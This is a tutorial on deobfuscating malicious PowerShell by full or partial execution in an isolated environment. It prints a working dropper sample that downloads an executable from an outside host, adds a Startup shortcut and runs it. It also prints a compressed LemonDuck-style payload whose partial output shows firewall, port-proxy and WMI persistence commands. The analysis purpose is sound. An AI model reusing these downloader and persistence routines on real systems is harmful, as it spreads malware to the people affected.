# Basic

When doing malware analysis, debugging and code execution is always your best friend when facing some sort of obfuscation. Same goes for Powershell

## Deobfuscation through Full Execution
Warning: This step REQUIRES you to do it in an isolated environment.

For this, you can utilize tools such as [PowerDecode]("https://github.com/Malandrone/PowerDecode") to help with the obfuscation.

You can also opt for a more manual dynamic analysis approach by executing the script with specific settings enabled in your environment.
Settings you would to enable for this would be (Enabled through gpedit.msc [Link]("https://docs.nxlog.co/integrate/powershell-activity.html")):
1. Powershell Transcripts
2. Powershell Script block logging

For Powershell Transcripts:
1. Execute the Powershell script
2. Find the logs in "C:\Users\<user\Documents\<DateOfExecution>" folder
3. It will give logs about the executed powershell but in an already deobfuscated format.

For Powershell Script block logging:
1. Execute the powershell
2. Go to Windows Event Logs
3. Go to Microsoft-Windows-PowerShell/Operational
4. Look for event ids 4104, 4105, and 4106
5. It will show logs of executed Powershell commands both obfuscated and the final unobfuscated version.

## Deobfuscation through Partial Execution
Warning: This step REQUIRES you to do it in an isolated environment.
This requires you to need to know about a bit PowerShell syntaxes for easier deobfuscation.

This section would teach you to run SOME of the obfuscated code and save the result somewhere, and not the whole script.
The nifty thing about this technique you can opt to use online powershell platforms if you allowed to. I usually opt for [tio.run](https://tio.run/#powershell)

Let's take a look at a simple script from the file 5dfde4bff42949705c4bbce0b37dfc88b0fd5d447fd8f5aed00850b6264d1160.zip

```powershell
$u="aHR0cHM6Ly9iaXRlYmxvYi5jb20vRG93bmxvYWQvT3E3NVJkM2JGVGlVNGcvdXBkYXRlLmpwZw=="
$s="U3RhcnR1cA=="
$p="YS5sbms="
$j="LmpwZw=="
$x="LmV4ZQ=="
$d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u))
$sf=[IO.Path]::Combine([Environment]::GetFolderPath('Startup'))
$sp=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))
$extJpg=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($j))
$extExe=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x))
$r=-join((48..57+65..90+97..122|Get-Random -Count 8|ForEach-Object{[char]$_}))
$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),"$r$extJpg")
$e=$t -replace [regex]::Escape($extJpg),$extExe
(New-Object Net.WebClient).DownloadFile($d,$t)
ren $t $e
$sc=(New-Object -ComObject WScript.Shell).CreateShortcut([IO.Path]::Combine($sf,$sp))
$sc.TargetPath=$e
$sc.Save()
[System.Diagnostics.Process]::Start($e)
```
Now successfully employ this technique, you cherry pick some of the variables that you want to know about together with its dependencies.
Let's say you want to know what the variable $sf, $sp, and $d contains. You would run it like

```powershell
$u="aHR0cHM6Ly9iaXRlYmxvYi5jb20vRG93bmxvYWQvT3E3NVJkM2JGVGlVNGcvdXBkYXRlLmpwZw=="
$s="U3RhcnR1cA=="
$p="YS5sbms="
$d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u))
$sf=[IO.Path]::Combine([Environment]::GetFolderPath('Startup'))
$sp=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))

# Print output
echo $d
echo $sf
echo $sp
```

You'll get the result
```
https://biteblob.com/Download/Oq75Rd3bFTiU4g/update.jpg
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
a.lnk
```


Let's look at a sample from this [blog](https://fareedfauzi.github.io/2021/02/06/LemonDuck-Powershell.html#bonus-tips), where I learned a lot of these tips and tricks.
```powershell
I`EX $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$('edbd07601c499625262f6dca7b7f4af54ad7e074a10880601324d8904010ecc188cde692ec1d69472329ab2a81ca6556655d661640cced9dbcf7de7befbdf7de7befbdf7ba3b9d4e27f7dfff3f5c6664016cf6ce4adac99e2180aac81f3f7e7c1f3f227eb7e7df7d903ffb2c4d3fbaf3f1effdf127dfbfb7fbbda745599ece9bdfed93efef7e6f5694cf4fbfddfc6ee9d638fd993b7b0fbf5f1f7f7bfabdef7ffea2a8dbd7df1bddd9bd2f9f7cf2a9f9657f67577edbda3a9d66e5cbbc1edff9f877fb78f4f1ce8b871fbb8f1edeeb82b22f7eb2677fbbb71b01f61b27bf7192de493ffee4e33bfbf7be4f3fea6c7ef2bdef5fbc38abdf00d0c307dfe74f3eb90738fcdbdeaefe66e0bc1adff9f4a17ce45e7c70a0cd774df34f76b491f7defcfc17dd3b98d3bf34fa3d6d47487cb26fbaddf13ef5dedba78f7bc81298879fd3a7e7f48b6bfaf01e7dd4c56ecfc07ff8a9fd5648d5479068cd083edcd776077644f7154cf8c2b3bb69d6b4afd2657b37cddbbccc6777d3e66d93b5f4dd27f4fff9b401d9a9d9ee40bb694358699bbdacd1f7d0d4fcda7f03cd7fe3e4edb42a279f2dabc27436cdd2fbf7763f6beb6aa59f94fa33a3a6e96ada7e5656d3aaadea55ba2c3eab8b59fae5c58a5eb95ee633faedb39c505964cb342fd7752aafd227bf6836cbd2b2ccaef2ba38b7bf5cd287f3a6cd97820ab533d8008dfd7d46a344c78a83f66f70eda1b1bfcf681020c284fed586f922a33f14a79b31b9779f3b6ea7f972594dd3dd31fff759d3e435bd6c3e7eb877fffea7dc7099b74d51a6fb9755bb7fc9f0afdf1162f82acda7d9799db7cb22cddfe563ee82e70a98d1ff7fe364f6fac553fde3b5c0c4209572bfe862592cf355c5a07cc40906006a2b819b4e6996dfd137f978b6986220bfc4eb279fd6d5b3dfe3f7f83dd2dd345f97d94f6ea74f5f7df9dda769beba7eb36dba23d26394ab4575929793ac299e82ac0d0d804858672fafbff3aece2febfcf5325b2cb3e7f467934f0b7c40bfb6f9ebb2aadb6545289cb4cbbcaed727d7df51c8efbe387df3faf741b3475f3cffbdbe4d50d3799bbddc4eaf5b08268db17ea94d17797bb64dc0527a7814f28b1dc9fd7495e765b3ddd659db4015a5f270db3bbf8440d3f08bc5d5eee5ef954eb78964f95cdfa5815c1121a7779951dbac5c2df237f9b2783ea3f1d0980fe9734c13bd4f88eedd234c2059d7cdf577e8c7bbe6aa9a19892aae3094290019e8d4844604bab5eb69feeef45044e1453e6f77e9b7cbdfeb136acd6f10315ffce2df336d30f465be585fd4c7db2034387f55d4d366b26e40d0aaaa4128e2a1558377b6d39a61ae9b65050a03eaa9877fda345979b24d2f2c8934cb39949b11c0b362f15d5075ebb33a17008777564692dad7294bdd715dd5f5e976fa4b40896f9f9e8300d7af7fffd75f120fbffcfdb3367b3a333cd7b6d982388abfd8bbb72cbe4bcdd3e3d767d4394685fecfdafc82b5ee9bf4f4d5e9b7bf9beeec7c7a2f7d71f6ed3767df4d09fd4bfaf214e2405d6746a68bf362868fbed0419cfdfebf7ffac597af9e61a2bf95be39397dae2d4f5f8394d775befe09fd04483fff89ef32852fb2f5c512526f9a5343fc264a61fd1368bb77b92830d1983821f56720f56b901ae8d10ceaf4c9dc9d0773673801f38751d2ff65169d2cc526d3bc35cd56afcd9cb625bd5c3ce33e69b8e12cd2c4d1b776eedab27826fddf8e710ceb4b5fa44f66cbe209b1807ece9c50bd01f6b9b101d483c5c2f1b687cf778d781ab1bb4393bf6a7e7a9c65f4cbe8dba7fa967c461f6d1126e50a1ec49dfb5b8443dd02d3f19a084badcff7bef2da50576836daf11b2a406dbfebb71f37ab05cd10bdf67b7de604df436e99bd224654c3a4d3e9be57c8bf71f28bef34c0c7dacc22c59f5bf36996d7d5b901a65f924ade2c32d4992f354c5e92187d9d05c770822f3f78edcc529ad036c2a38d5586a8198b111823358a00e8642c3f2c3c8edb03311219b2c2432d4418444ba00f2742f8f202024aaa1e72e60bcd80c4d04764a3266f696e26a1b8dc8e5d3d99d8201096013125bff8ce6e5b54339a2c2552da56cbedadf3025f7e6c9c008cee97fce2f9d4307936fd25f8fe4bc8eeca90f7f4dc204f9f4e6846187fe0c6089d6bb3ed94be8a0c0253c883c07407e3c0076e280a663b255fe2a7275f9e7d61669786f5f967bb06450c8a7ffd187afc523ffdbd78ccd75039ad38713c905ff263f837b08d3ff66332c2d5122c4f389e2f0de85dfdc96283f1c1a9f458665d5b4f515b2ab45dd3817eecfaf925f687fc04adc13a537c62bf92dfcad248f472bb5d570f3f3fbf431f2d217e76c27ed168271d994fdd2ffbe9e84e548b384aa93e01cd9dda09f5c98022d19ea14f7eaf1191e5e91727bfffeb97f4cb967e639a968bdf7b0cf2304ac624d28c9b0fb7e8e79b1a7ee10579f9753e331e6c0546a4063f6669f163bff8ce9da0ab665964e4459d8cadd08c89d7dcdc90738c1ece0b0be2175fd72dfdaa5d989ffc4d7a47ff6a445b01545b2c8bf3fc29e1aadfc938c84715d75b3f4527a9aa3fd3d11d526f851938bdf09650d211db965ef77776b7c045fac91be26ea645754e2f7c66a8e6204a27a0c6b961591084b514bdf5ac3594fe7c7c59376d0328044f3f14b01d36edf1a72535f9868e65520a1b66c53cbd127f118ea242a5afab156b0092108aafe8ef50a29cde3172b4f3695a2deeea87e9e99baf5e9c7d914e1bc46044a2a995acc6cd99cc55de94791ae2a9df035dead96117e0d443c879211e423e26048b0d559342d23b78614eed84678dd856e637674ee9a3f4b3943b53f2fe127c0199bbf84c90f8c518ce2fb923edb73e713a1661035ce9e2bbf49b7eda9e57afab7a5a7c4110a0771504778fbee9e35f7c672ffd45f9767aef7777b6aa3092c02848570ad182d8d5b7b4ad7eadaf505fe8cebacabfc8bcb513be65858b3994f54723fe81bef6e53be6d2e5d9a347dfbfceea3afb1ed1072f1b42aa77e1dc0ac7602c374e89776c2848ad136d3f9669dddba579a5af83a9ed3359c05c910e0cabc43b21f8dccf8dfca360eea68e9884034c8087869d50fd532db76fb2d972a879bed34195f52ad408beb0ea417483a71414aad18d0c694b02f713db0a9f6af43aa6cc004536d3d7a9cd83c0305348656cf4f655fe8226d47f979c5e0c74514dc70fd7f72693712bceaf7c52e76f7f30a6effd0f41cbfade0f7ec02db77ecfcf982578c877ee7cfabbdf59904c64afe0036c7df2e916f9756bf4ef3e8599dcdbdb1d8f1f3ca4e4d8787cffd34f1edc1f8f0ff6b7befffdef5162895275cba2fae9ed7459afdb5cfc4b9e8a5f7c674b44030a1e384d97eb7343deba6a33e38b92bd5a168bd93174cbf7f3b27a453ea87e5516eb272ab5e3325b155332a62fc7d76d5153b0fbfa7b5bd2ba39e394165e20824b0e8030874cb405fd3d3bebc320842c98efdb8fc1387e53851af4aa9f7d6febb34c26453ff88d13a2ef9db26649cb0eef88907f4b7e3089ee08b16b23bea3a7675f7d35be63677f3da37c84b8f264c5d7488888972eec505194b10dad363afde2f8c5ab5383c9578f2e973974837cfce6ab975f7c79c29f6903c2e7f72455c888fc1ef4ff4f2ea935fee648e9ae7ca1dfef7d25bad07dc2ee8afbf3eedd47abb69df31f460d7d26a3fe25bfe497dc99d04fc3183ce8ad77f977ab9f22a067bfd84ed29d3bdfdf7d402cb5f3bd19373724f5d849fca6d7fb9fe64df66451195e794693dad6c6221befd4444fd594d2a62499c52511128da85be54611b9aa5d5dd727bbc7df7e3dbe36199455565f207bc45fd14f4cb47e45f3adbf91e38f39704a4684736b34e1d9a668ebfabca02cd5b8164543690efce292580ac74b712ecec6083ba9d9a145d9c7f2f8f52b4292b1e3bfc7f0be95073dfdf0197a3cdcdd79b733dac13ff8ed3362fa65b57a773a061686153fdbd9cdbe3d7bfe2545c8869c0f5e7dfafb9ce5e7bb3fbd7b39fd89af56cff7eefea09cfcf4eae4f9d39f9edc3ff862e7e4feef53ae7fd177df2e4fbeca5f3c9fef9fe7bf08a2bcffea07ef96f7a6c7af7fea607af5f6d54ebd738f5cc6e793f5f3d5c1eec1f362faf4bb3baf7e9fbb6fa0b0f7ea7bbfd78345f9eddfe76c5ab43f78f383cbbd172fee7d71f5f0ecd9cb9fde7f5b7ff77cefd39f6cbf3d59bf582edebcb877975eb93cb8bc982d56bff793ddcf2f7feff583ddeabb8b3d67c7a1c48437f423cb22c21bf22981f945f9a5c7179f35fafbda38c5246daeed1742a9c6b2964e9b4c02b5f0e7c134e9cf0503f9fe94fe1d8fef3dd865f6fe0c2cf28befd09f690b0f663bc5f70a03f102710bb4ee74ccada792b63bbc73676bb6ccabd6389a19471477b616f44bdbe4e459537aae267530be63e304ff43564362234197265fffa2bc9ee45763e3cf62d8cbefc19065f92b1874007e0dc58854f699c254d543a333c4dcda6af2f67a62dde28bf1c1796b222bea0ad91e02504d97f9d8a8b67779fb3dfd95befa6cc614114529ee3f990670a86455d4d051cbd3f3d9ec8b2faee9f9fde5cf541280dbb0fe4fc56891d9803efb3de8e767f48b76c3302030f0c5c9d559926f92bfab2617cd02c9666db532c2b826f78284a60477379476b864ff1669d99d9d1d8a8d966bb2fb799d5d95d917db64538e390b4d6490cfe8ad2f9c5bb9fb4b1d85c136f54b581bcadc9ec0c491974419236dcaeec025e21fc779a4ff96ec10b5dcb19988d2ad89003722d7efae1f18cb44a424fdf2e277ff3632026f6971807878892e73027ea549408ae4606756bc3480c4553aa1a173565b30f351eae282dfb477edfbfc776fd675f19320894187baff18993b8bc1c758195124a47743fe5b224100627828142586a1c2d0f0b9677de5c3877ffebb43295c66bfbbd34c839d767a335c39dc21b5409f0ab9df75db64e8d9756938e3869ebd6ef50de95dfff091d08f86066f59ef2da9cc5593fd5ebffb00d9c1093773dcc7589db24450d89b88dfe6cde9c689ee756748647b9d439571a6e2f7c677dfdfb9f7bdd3c597df6e5ed25a2aad84ef7deff48b2fe7aff157ba958ed38fb768c9fc301d6fa5bfdb65fe6a5235f9cbfaf49cb2a42f4ef2f19b2f5fb7f5d9f262ebcef77647f7beff09adac6fff7475b6fcf8e33bd4c7e779bb7d79fcea2c9b3c3f4dd3f2ea414e99dd3be3cbacfc2affde36f941db5be9e656e3325f7efe669edef9fef64f7f59bc20b0bf71f2ff00'-split'(..)'|?{$_}|%{[convert]::ToUInt32($_,16)}))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
```

For this kind of things, the thing you WILL want to look out for is IEX and any of its obfuscated version. To safely run this program, remove the "IEX" and run it as you would any other script.

```powershell
$(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$('edbd07601c499625262f6dca7b7f4af54ad7e074a10880601324d8904010ecc188cde692ec1d69472329ab2a81ca6556655d661640cced9dbcf7de7befbdf7de7befbdf7ba3b9d4e27f7dfff3f5c6664016cf6ce4adac99e2180aac81f3f7e7c1f3f227eb7e7df7d903ffb2c4d3fbaf3f1effdf127dfbfb7fbbda745599ece9bdfed93efef7e6f5694cf4fbfddfc6ee9d638fd993b7b0fbf5f1f7f7bfabdef7ffea2a8dbd7df1bddd9bd2f9f7cf2a9f9657f67577edbda3a9d66e5cbbc1edff9f877fb78f4f1ce8b871fbb8f1edeeb82b22f7eb2677fbbb71b01f61b27bf7192de493ffee4e33bfbf7be4f3fea6c7ef2bdef5fbc38abdf00d0c307dfe74f3eb90738fcdbdeaefe66e0bc1adff9f4a17ce45e7c70a0cd774df34f76b491f7defcfc17dd3b98d3bf34fa3d6d47487cb26fbaddf13ef5dedba78f7bc81298879fd3a7e7f48b6bfaf01e7dd4c56ecfc07ff8a9fd5648d5479068cd083edcd776077644f7154cf8c2b3bb69d6b4afd2657b37cddbbccc6777d3e66d93b5f4dd27f4fff9b401d9a9d9ee40bb694358699bbdacd1f7d0d4fcda7f03cd7fe3e4edb42a279f2dabc27436cdd2fbf7763f6beb6aa59f94fa33a3a6e96ada7e5656d3aaadea55ba2c3eab8b59fae5c58a5eb95ee633faedb39c505964cb342fd7752aafd227bf6836cbd2b2ccaef2ba38b7bf5cd287f3a6cd97820ab533d8008dfd7d46a344c78a83f66f70eda1b1bfcf681020c284fed586f922a33f14a79b31b9779f3b6ea7f972594dd3dd31fff759d3e435bd6c3e7eb877fffea7dc7099b74d51a6fb9755bb7fc9f0afdf1162f82acda7d9799db7cb22cddfe563ee82e70a98d1ff7fe364f6fac553fde3b5c0c4209572bfe862592cf355c5a07cc40906006a2b819b4e6996dfd137f978b6986220bfc4eb279fd6d5b3dfe3f7f83dd2dd345f97d94f6ea74f5f7df9dda769beba7eb36dba23d26394ab4575929793ac299e82ac0d0d804858672fafbff3aece2febfcf5325b2cb3e7f467934f0b7c40bfb6f9ebb2aadb6545289cb4cbbcaed727d7df51c8efbe387df3faf741b3475f3cffbdbe4d50d3799bbddc4eaf5b08268db17ea94d17797bb64dc0527a7814f28b1dc9fd7495e765b3ddd659db4015a5f270db3bbf8440d3f08bc5d5eee5ef954eb78964f95cdfa5815c1121a7779951dbac5c2df237f9b2783ea3f1d0980fe9734c13bd4f88eedd234c2059d7cdf577e8c7bbe6aa9a19892aae3094290019e8d4844604bab5eb69feeef45044e1453e6f77e9b7cbdfeb136acd6f10315ffce2df336d30f465be585fd4c7db2034387f55d4d366b26e40d0aaaa4128e2a1558377b6d39a61ae9b65050a03eaa9877fda345979b24d2f2c8934cb39949b11c0b362f15d5075ebb33a17008777564692dad7294bdd715dd5f5e976fa4b40896f9f9e8300d7af7fffd75f120fbffcfdb3367b3a333cd7b6d982388abfd8bbb72cbe4bcdd3e3d767d4394685fecfdafc82b5ee9bf4f4d5e9b7bf9beeec7c7a2f7d71f6ed3767df4d09fd4bfaf214e2405d6746a68bf362868fbed0419cfdfebf7ffac597af9e61a2bf95be39397dae2d4f5f8394d775befe09fd04483fff89ef32852fb2f5c512526f9a5343fc264a61fd1368bb77b92830d1983821f56720f56b901ae8d10ceaf4c9dc9d0773673801f38751d2ff65169d2cc526d3bc35cd56afcd9cb625bd5c3ce33e69b8e12cd2c4d1b776eedab27826fddf8e710ceb4b5fa44f66cbe209b1807ece9c50bd01f6b9b101d483c5c2f1b687cf778d781ab1bb4393bf6a7e7a9c65f4cbe8dba7fa967c461f6d1126e50a1ec49dfb5b8443dd02d3f19a084badcff7bef2da50576836daf11b2a406dbfebb71f37ab05cd10bdf67b7de604df436e99bd224654c3a4d3e9be57c8bf71f28bef34c0c7dacc22c59f5bf36996d7d5b901a65f924ade2c32d4992f354c5e92187d9d05c770822f3f78edcc529ad036c2a38d5586a8198b111823358a00e8642c3f2c3c8edb03311219b2c2432d4418444ba00f2742f8f202024aaa1e72e60bcd80c4d04764a3266f696e26a1b8dc8e5d3d99d8201096013125bff8ce6e5b54339a2c2552da56cbedadf3025f7e6c9c008cee97fce2f9d4307936fd25f8fe4bc8eeca90f7f4dc204f9f4e6846187fe0c6089d6bb3ed94be8a0c0253c883c07407e3c0076e280a663b255fe2a7275f9e7d61669786f5f967bb06450c8a7ffd187afc523ffdbd78ccd75039ad38713c905ff263f837b08d3ff66332c2d5122c4f389e2f0de85dfdc96283f1c1a9f458665d5b4f515b2ab45dd3817eecfaf925f687fc04adc13a537c62bf92dfcad248f472bb5d570f3f3fbf431f2d217e76c27ed168271d994fdd2ffbe9e84e548b384aa93e01cd9dda09f5c98022d19ea14f7eaf1191e5e91727bfffeb97f4cb967e639a968bdf7b0cf2304ac624d28c9b0fb7e8e79b1a7ee10579f9753e331e6c0546a4063f6669f163bff8ce9da0ab665964e4459d8cadd08c89d7dcdc90738c1ece0b0be2175fd72dfdaa5d989ffc4d7a47ff6a445b01545b2c8bf3fc29e1aadfc938c84715d75b3f4527a9aa3fd3d11d526f851938bdf09650d211db965ef77776b7c045fac91be26ea645754e2f7c66a8e6204a27a0c6b961591084b514bdf5ac3594fe7c7c59376d0328044f3f14b01d36edf1a72535f9868e65520a1b66c53cbd127f118ea242a5afab156b0092108aafe8ef50a29cde3172b4f3695a2deeea87e9e99baf5e9c7d914e1bc46044a2a995acc6cd99cc55de94791ae2a9df035dead96117e0d443c879211e423e26048b0d559342d23b78614eed84678dd856e637674ee9a3f4b3943b53f2fe127c0199bbf84c90f8c518ce2fb923edb73e713a1661035ce9e2bbf49b7eda9e57afab7a5a7c4110a0771504778fbee9e35f7c672ffd45f9767aef7777b6aa3092c02848570ad182d8d5b7b4ad7eadaf505fe8cebacabfc8bcb513be65858b3994f54723fe81bef6e53be6d2e5d9a347dfbfceea3afb1ed1072f1b42aa77e1dc0ac7602c374e89776c2848ad136d3f9669dddba579a5af83a9ed3359c05c910e0cabc43b21f8dccf8dfca360eea68e9884034c8087869d50fd532db76fb2d972a879bed34195f52ad408beb0ea417483a71414aad18d0c694b02f713db0a9f6af43aa6cc004536d3d7a9cd83c0305348656cf4f655fe8226d47f979c5e0c74514dc70fd7f72693712bceaf7c52e76f7f30a6effd0f41cbfade0f7ec02db77ecfcf982578c877ee7cfabbdf59904c64afe0036c7df2e916f9756bf4ef3e8599dcdbdb1d8f1f3ca4e4d8787cffd34f1edc1f8f0ff6b7befffdef5162895275cba2fae9ed7459afdb5cfc4b9e8a5f7c674b44030a1e384d97eb7343deba6a33e38b92bd5a168bd93174cbf7f3b27a453ea87e5516eb272ab5e3325b155332a62fc7d76d5153b0fbfa7b5bd2ba39e394165e20824b0e8030874cb405fd3d3bebc320842c98efdb8fc1387e53851af4aa9f7d6febb34c26453ff88d13a2ef9db26649cb0eef88907f4b7e3089ee08b16b23bea3a7675f7d35be63677f3da37c84b8f264c5d7488888972eec505194b10dad363afde2f8c5ab5383c9578f2e973974837cfce6ab975f7c79c29f6903c2e7f72455c888fc1ef4ff4f2ea935fee648e9ae7ca1dfef7d25bad07dc2ee8afbf3eedd47abb69df31f460d7d26a3fe25bfe497dc99d04fc3183ce8ad77f977ab9f22a067bfd84ed29d3bdfdf7d402cb5f3bd19373724f5d849fca6d7fb9fe64df66451195e794693dad6c6221befd4444fd594d2a62499c52511128da85be54611b9aa5d5dd727bbc7df7e3dbe36199455565f207bc45fd14f4cb47e45f3adbf91e38f39704a4684736b34e1d9a668ebfabca02cd5b8164543690efce292580ac74b712ecec6083ba9d9a145d9c7f2f8f52b4292b1e3bfc7f0be95073dfdf0197a3cdcdd79b733dac13ff8ed3362fa65b57a773a061686153fdbd9cdbe3d7bfe2545c8869c0f5e7dfafb9ce5e7bb3fbd7b39fd89af56cff7eefea09cfcf4eae4f9d39f9edc3ff862e7e4feef53ae7fd177df2e4fbeca5f3c9fef9fe7bf08a2bcffea07ef96f7a6c7af7fea607af5f6d54ebd738f5cc6e793f5f3d5c1eec1f362faf4bb3baf7e9fbb6fa0b0f7ea7bbfd78345f9eddfe76c5ab43f78f383cbbd172fee7d71f5f0ecd9cb9fde7f5b7ff77cefd39f6cbf3d59bf582edebcb877975eb93cb8bc982d56bff793ddcf2f7feff583ddeabb8b3d67c7a1c48437f423cb22c21bf22981f945f9a5c7179f35fafbda38c5246daeed1742a9c6b2964e9b4c02b5f0e7c134e9cf0503f9fe94fe1d8fef3dd865f6fe0c2cf28befd09f690b0f663bc5f70a03f102710bb4ee74ccada792b63bbc73676bb6ccabd6389a19471477b616f44bdbe4e459537aae267530be63e304ff43564362234197265fffa2bc9ee45763e3cf62d8cbefc19065f92b1874007e0dc58854f699c254d543a333c4dcda6af2f67a62dde28bf1c1796b222bea0ad91e02504d97f9d8a8b67779fb3dfd95befa6cc614114529ee3f990670a86455d4d051cbd3f3d9ec8b2faee9f9fde5cf541280dbb0fe4fc56891d9803efb3de8e767f48b76c3302030f0c5c9d559926f92bfab2617cd02c9666db532c2b826f78284a60477379476b864ff1669d99d9d1d8a8d966bb2fb799d5d95d917db64538e390b4d6490cfe8ad2f9c5bb9fb4b1d85c136f54b581bcadc9ec0c491974419236dcaeec025e21fc779a4ff96ec10b5dcb19988d2ad89003722d7efae1f18cb44a424fdf2e277ff3632026f6971807878892e73027ea549408ae4606756bc3480c4553aa1a173565b30f351eae282dfb477edfbfc776fd675f19320894187baff18993b8bc1c758195124a47743fe5b224100627828142586a1c2d0f0b9677de5c3877ffebb43295c66bfbbd34c839d767a335c39dc21b5409f0ab9df75db64e8d9756938e3869ebd6ef50de95dfff091d08f86066f59ef2da9cc5593fd5ebffb00d9c1093773dcc7589db24450d89b88dfe6cde9c689ee756748647b9d439571a6e2f7c677dfdfb9f7bdd3c597df6e5ed25a2aad84ef7deff48b2fe7aff157ba958ed38fb768c9fc301d6fa5bfdb65fe6a5235f9cbfaf49cb2a42f4ef2f19b2f5fb7f5d9f262ebcef77647f7beff09adac6fff7475b6fcf8e33bd4c7e779bb7d79fcea2c9b3c3f4dd3f2ea414e99dd3be3cbacfc2affde36f941db5be9e656e3325f7efe669edef9fef64f7f59bc20b0bf71f2ff00'-split'(..)'|?{$_}|%{[convert]::ToUInt32($_,16)}))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
```
Running the above would give

```powershell
$LW7eF=  ")'X'+]31[DillEhs$+]1[dilLEHs$ (. |)29]rAHc[]GNirtS[,)15]rAHc[+65]rAHc[+401]rAHc[((EcalPer.)'$','0N9'(EcalPer.)93]rAHc[]GNirtS[,)401]rAHc[+201]rAHc[+311]rAHc[((EcalPer.)'

 ) '+')43]'+'rahC[]gNIrTS[,)97]rahC[+301]rahC[+211]rahC[((EcalPeR.)69]rahC[]gNIrTS[,)78]rahC[+111]rahC[+09]rahC[((EcalPeR.)hfq38hhfq,)121]rahC['+'+47]rahC[+021]rahC['+'((EcalPeR.)421]'+'rahC[]gNIrTS[,hfq9G'+'fhfq(EcalPeR.)93'+']rahC[]gNIrTS[,)27]rahC[+96'+']rahC[+201]rahC[((EcalPeR.)hfq0N9hfq,)94]rahC[+811]rahC[+57]rahC[((EcalPeR.)hfqF/ astR nt/ eteled/ sksathfq+hfqhcs

F/ 1astR nt/ eteled/ sksathcs'+'

F/ 2ashfq+hfqtR nhfq+hfqt/ eteled/ sksathcs


kcolb=noithfq+hfqca 531=trophfq+hfqlhfq+hfqacol pct=locotorp ni=rid Ogp531ynedOgp=e'+'man elur hfq+hf'+'qdda llawerif llawerifvda hsten

kc'+'olb=noitca 544=troplacolhfq+hfq pct=lohfq+hfqcotorp ni=rid Ogp544ynedO'+'gp='+'hfq+hfqema'+'n elur dda llawerif llawerifvda hsten

35=troptcennoc 1.1.1.1=sserddatcennoc 92556=tropnetsil 4vot4v dda yxorptrop ecafretni exe.hsten'+'
hfq+hfq
dSNDhfq+hfqS 92556 pct hfq+hfqgninepotrop dda llawerif'+' exehfq+hfq.hsten c/ ex'+'e.dmc

}
hfq+hfq
ecroF??? 1 eulaV- DROWD epyT- hfq+hfqnoisserpmoCelbasiD OgpsretemaraPyJxrevreSnamnaLyJxsecivreSyJxteSlortno'+'CtnerruCyJhfq+hfqxMETSYSyJx:MLKHOgp htaP- yt'+'reporPhfq+hfqmetI-teS    

}    
hfq+hfq
5 peels-trats '+'       

})}Ogpdmcimw1vK c- llehhfq+hfqsrewop c/Ogp=etalpmeTeniLdnammoC;Ogpexe.dmcyJx23mets'+'ysyJ'+'xswodnhfq+hfqiwyJx:cOgp=hhfq+hfq'+'taPelbatucexE;e'+'maNeht1'+'vK+OgpcOgp=emaN{@ st'+'nemugrA- OgpnoitpircsbusyJxtoorOgp ecapsemaN- re'+'musnoCtne'+'vEeniLdnammoC ssalC- ecnatsnh'+'fq+hf'+'qIimW-teS(=remusnoC;)pohfq+hfqtS noitcArorrE- };OgpHEfmetsyS_SOfreP_ataDdehfq+hfqttamroFfreP_23niWHEf ASI ec'+'natsnIteg'+'raT EREHW 0063 NIHTIW tnev'+'En'+'oitahfq+hfqcifid'+'oMecnatsnI__ MORF '+'* TCELhfq+hfqESOgp=yreuQhfq+hfq;OgpLQWOgp=egaugna'+'Lhfq+hfqyrehfq+'+'hfquQ;Ogp2vmicyJx'+'toorOgp=ecapSemaNtnevE;emaNeht1vK+OgpfOgp=emaN{@ stnhfq+hfqemug'+'r'+'A- Ogphfq+hfqnoitpircsbusyJxtoorOgp hfq+hfqecapSemaN- retl'+'iFtnevE__ ssalC- ecnatsnIim'+'W-teS(=retliF{@ stnemugrA- OgpnoitpircsbusyJxtoorOgp ecaphfq+hfqsemaN- gnidniBremhfq+hfqusnoCoTr'+'ethfq+hfqliF__ ssalC-hfq+hfq'+' ecnatsnIimW-teS        

)HEfpsj.aaHEf,HEhfq+hfqfpsj.aHEf(ecalper.))5(gnirtsbus.u1vK,HEf2UHEf(ecalper'+'.))5,0(gnirtsbus.uhfq+hfq1vK,HEf1UHEf(ecalper.spmt1v'+'K=dmcimw1vK        

naRteg=e'+'maNeht1vK        
hfq+hfq
{)su1vK nhfq+hfqi u1vK(hcaerof    

hfq+hfqpotS noitcArorrE- };OgpHEfmetsyS_'+'SOfreP_ataDd'+'ettamhfq+hfqroFfrhfq+hfqeP_23niWHEf A'+'SI ecnatsnItegraT EREHhfq+hfqW 0063 '+'NIHTI'+'W tne'+'vEnoitacifidoMecnhfq+'+'hfqatsnI__ MORF * TCELESOgp=yre'+'uQ;Ogphf'+'q+hfqLQWOgp=ega'+'ugn'+'aLyreuQ;Ogp2vmicyJxtoorOgp=ecapSemaNtnevE;OgpllabkcalbOgp=emaN{@ stnemugrA- OgpnoitpircsbusyJxtoorOgp ecapSemaN- retliFtnevE__ ssalC- ecnatsnIimW-teS    

{)1tiod1vKhfq+hfq ton-(fi

'+'hfq+hf'+'q}{hcthfq+hfqac}

Og'+'pHhfq+hfqEfllabkcal'+'bHEf=emaNOgp retlifhfq+hfq- HEfnoitpircsbusyJxtoorHEf ecapS'+'emaN- retliFtn'+'evE__ ssalChfq+hfq- tcejbOIMhfq+hfqW-teG=1thfq+hfqiod1hfq+h'+'fqvhfq+hfqK

{y'+'rt


}

}	

5 peels-trats		

Ogpnt1vKyJxfnthfq+hfq1hfq+hfqv'+'KOgp nt/ nhfq+'+'hfqur/ sksathchfq+hfqs		

1 peels-thfq+hfqrats		

}		

}			

}{hct'+'ac}				

}					

